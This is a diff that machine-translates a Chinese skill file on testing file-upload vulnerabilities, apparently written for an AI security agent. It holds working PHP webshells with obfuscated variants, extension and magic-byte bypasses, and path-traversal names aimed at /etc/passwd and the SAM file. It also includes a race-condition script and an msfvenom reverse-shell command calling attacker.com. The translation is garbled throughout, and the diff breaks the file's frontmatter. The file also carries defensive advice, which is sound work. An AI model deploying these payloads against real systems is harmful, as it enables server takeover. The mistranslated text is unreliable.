@@ -1,112 +1,112 @@
 ---
 name: file-upload-testing
-description: 文件上传漏洞测试的专业技能和方法论
+Professional skills and methodology for file-upload vulnerability testing
 version: 1.0.0
 ---
 
-# 文件上传漏洞测试
+# File Upload Vulnerability Testing
 
-## 概述
+## Overview
 
-文件上传功能是Web应用常见功能，但存在多种安全风险。本技能提供文件上传漏洞的检测、利用和防护方法。
+This skill provides detection, use, and protection against file-upload vulnerabilities.
 
-## 漏洞类型
+## Vulnerability Types
 
-### 1. 未验证文件类型
+### 1. File type not verified
 
-**仅前端验证：**
+**Frontend only:**
 ```javascript
-// 可被绕过
+// It's been bypassed.
 if (!file.name.endsWith('.jpg')) {
-  alert('只允许上传图片');
+  alert('Only upload pictures are allowed');
 }
 ```
 
-### 2. 文件内容未验证
+### 2. File content not verified
 
-**仅检查扩展名：**
+**Check extension only:**
 ```php
-// 危险代码
+// Dangerous code
 if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == 'jpg') {
   move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
 }
 ```
 
-### 3. 路径遍历
+### 3. Path Traversal
 
-**未过滤文件名：**
+**Unfiltered filename:**
 ```
 filename: ../../../etc/passwd
 filename: ..\..\..\windows\system32\config\sam
 ```
 
-### 4. 文件名覆盖
+### 4. Filename Overwrite
 
-**可预测的文件名：**
+**Predictable title:**
 ```
 uploads/1.jpg
 uploads/2.jpg
 ```
 
-## 测试方法
+## Test Method
 
-### 1. 基础检测
+### 1. Basic Detection
 
-**测试各种文件类型：**
+**Test various file types:**
 - .php, .jsp, .asp, .aspx
 - .php3, .php4, .php5, .phtml
 - .jspx, .jspf
 - .htaccess, .htpasswd
 
-**测试双扩展名：**
+**Test double extension:**
 ```
 shell.php.jpg
 shell.jpg.php
 ```
 
-**测试大小写：**
+**Test case:**
 ```
 shell.PHP
 shell.PhP
 ```
 
-### 2. 内容类型绕过
+### 2. Content type bypass
 
-**修改Content-Type：**
+**Modified Content-Type:**
 ```
 Content-Type: image/jpeg
-# 但文件内容是PHP代码
+# But the contents of the document are:PHPCode
 ```
 
-**Magic Bytes：**
+**Magic Bytes:**
 ```php
-// 在PHP代码前添加图片头
+// Yes.PHPAdd a header before the code
 GIF89a<?php phpinfo(); ?>
 ```
 
-### 3. 解析漏洞
+### 3. Parse the Vulnerability
 
-**Apache解析漏洞：**
+**Apache parse leak:**
 ```
-shell.php.xxx  # Apache可能解析为PHP
+shell.php.xxx  # ApacheCould be parsed asPHP
 ```
 
-**IIS解析漏洞：**
+**IIS parse leak:**
 ```
 shell.asp;.jpg
 shell.asp:.jpg
 ```
 
-**Nginx解析漏洞：**
+**Nginx parse leak:**
 ```
 shell.jpg%00.php
 ```
 
-### 4. 竞争条件
+### 4. Competition conditions
 
-**文件上传后立即访问：**
+**Accessed immediately after uploading:**
 ```python
-# 上传.php文件，在上传完成但删除前访问
+# Upload. phpFile, access before uploading but deleating
 import requests
 import threading
 
@@ -122,39 +122,39 @@ threading.Thread(target=upload).start()
 threading.Thread(target=access).start()
 ```
 
-## 利用技术
+## Exploitation Techniques
 
 ### PHP WebShell
 
-**基础WebShell：**
+**Base Webshell:**
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-**一句话木马：**
+**One word for a wooden horse:**
 ```php
 <?php eval($_POST['a']); ?>
 ```
 
-**绕过过滤：**
+**Close filters:**
 ```php
 <?php
 $_GET['cmd']($_POST['a']);
-// 使用: ?cmd=system
+// Using: ?cmd=system
 ```
 
-### .htaccess利用
+### . htaccessExploit
 
-**上传.htaccess：**
+**Upload. haccess:**
 ```
 AddType application/x-httpd-php .jpg
 ```
 
-**然后上传shell.jpg（实际是PHP代码）**
+**Then upload shell. jpg (actually PHP code)**
 
-### 图片马
+### Image webshell
 
-**GIF图片马：**
+**GIF Photo horse:**
 ```php
 GIF89a
 <?php
@@ -162,57 +162,57 @@ phpinfo();
 ?>
 ```
 
-**PNG图片马：**
+**PNG photo horse:**
 ```bash
-# 使用工具将PHP代码嵌入PNG
+# Use tool willPHPCode EmbeddedPNG
 python3 png2php.py shell.php shell.png
 ```
 
-### 文件包含配合
+### File Include Compatibility
 
-**如果存在文件包含漏洞：**
+**If there is a file containing a bug:**
 ```
-# 上传包含PHP代码的图片
-# 然后通过文件包含执行
+# Upload IncludePHPPicture of the code
+# And then include execution through the document.
 ?file=uploads/shell.jpg
 ```
 
-## 绕过技术
+## Bypass Techniques
 
-### 扩展名绕过
+### Extension bypassed
 
-**双扩展名：**
+**Double extensions:**
 ```
 shell.php.jpg
 shell.php;.jpg
 shell.php%00.jpg
 ```
 
-**大小写：**
+**Case size:**
 ```
 shell.PHP
 shell.PhP
 ```
 
-**特殊字符：**
+**Special character:**
 ```
 shell.php.
-shell.php 
+shell.php
 shell.php%20
 ```
 
-### Content-Type绕过
+### Content-TypeBypass
 
-**修改请求头：**
+**Revised requesthead:**
 ```
 Content-Type: image/jpeg
 Content-Type: image/png
 Content-Type: image/gif
 ```
 
-### Magic Bytes绕过
+### Magic BytesBypass
 
-**添加文件头：**
+**Add header:**
 ```php
 // JPEG
 \xFF\xD8\xFF\xE0<?php phpinfo(); ?>
@@ -224,14 +224,14 @@ GIF89a<?php phpinfo(); ?>
 \x89\x50\x4E\x47<?php phpinfo(); ?>
 ```
 
-### 代码混淆
+### Code Confusion
 
-**使用短标签：**
+**Using short labels:**
 ```php
 <?= system($_GET['cmd']); ?>
 ```
 
-**使用变量：**
+**Using variables:**
 ```php
 <?php
 $a='sys';
@@ -239,50 +239,50 @@ $b='tem';
 $a.$b($_GET['cmd']);
 ```
 
-## 工具使用
+## Using the Tools
 
 ### Burp Suite
 
-1. 拦截文件上传请求
-2. 修改文件名和内容
-3. 测试各种绕过技术
+1. Interception of file upload request
+2. Modify File Name and Contents
+3. Test all kinds of bypass techniques.
 
 ### Upload Bypass
 
 ```bash
-# 使用各种技术测试文件上传
+# Upload using various technical test files
 python upload_bypass.py -u http://target.com/upload -f shell.php
 ```
 
-### WebShell生成
+### WebShellGenerate
 
 ```bash
-# 生成各种WebShell
+# Generates a variety ofWebShell
 msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
 ```
 
-## 验证和报告
+## Verification and Reporting
 
-### 验证步骤
+### Verification Steps
 
-1. 确认可以上传恶意文件
-2. 验证文件可以执行
-3. 评估影响（命令执行、数据泄露等）
-4. 记录完整的POC
-5. 通过 `report_finding` 工具将确认的漏洞录入平台（本平台记录漏洞的唯一入口），字段涵盖位置、类型、严重度、复现步骤/PoC 与修复建议
+1. Confirm that you can upload malicious documents.
+2. Verify that the file executes
+3. Assess the impact (order execution, data disclosure, etc.)
+4. Record the completePOC
+5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration
 
-### 报告要点
+### Reporting Checklist
 
-- 漏洞位置和上传功能
-- 可上传的文件类型和执行方式
-- 完整的利用步骤和PoC
-- 修复建议（文件类型验证、内容检查、安全存储等）
+- Leak position and upload function
+- Type of file and manner of implementation that can be uploaded
+- the complete exploitation steps andPoC
+- Recommendations for restoration (document type validation, content checking, secure storage, etc.)
 
-## 防护措施
+## Preventive Measures
 
-### 推荐方案
+### Recommended Approach
 
-1. **文件类型白名单**
+1. **White list of document types **
    ```python
    ALLOWED_EXTENSIONS = {'jpg', 'png', 'gif'}
    ext = filename.rsplit('.', 1)[1].lower()
@@ -290,7 +290,7 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > s
        raise ValueError("File type not allowed")
    ```
 
-2. **文件内容验证**
+2. **Document content validation **
    ```python
    import magic
    file_type = magic.from_buffer(file_content, mime=True)
@@ -298,32 +298,32 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > s
        raise ValueError("Invalid file content")
    ```
 
-3. **重命名文件**
+3. **Rename File **
    ```python
    import uuid
    filename = str(uuid.uuid4()) + '.' + ext
    ```
 
-4. **隔离存储**
-   - 文件存储在Web根目录外
-   - 通过脚本代理访问
-   - 禁用执行权限
+4. **Isolated Storage **
+   - File stored outside the Web root directory
+   - Access via script proxy
+   - Disable executory permissions
 
-5. **文件扫描**
-   - 使用杀毒软件扫描
-   - 检查文件内容
-   - 移除可执行权限
+5. **File Scanning **
+   - Scanning with anti-drug software
+   - Check file contents
+   - Remove executable permissions
 
-6. **大小限制**
+6. **Size Limit **
    ```python
    MAX_SIZE = 5 * 1024 * 1024  # 5MB
    if file.size > MAX_SIZE:
        raise ValueError("File too large")
    ```
 
-## 注意事项
+## Important Notes
 
-- 仅在授权测试环境中进行
-- 避免上传恶意文件到生产环境
-- 测试后及时清理
-- 注意不同服务器的解析差异
+- Perform only in an authorized testing environment
+- Avoid uploading malicious documents to the production environment
+- Clean up in a timely manner after testing
+- Pay attention to differences in the resolution of different servers
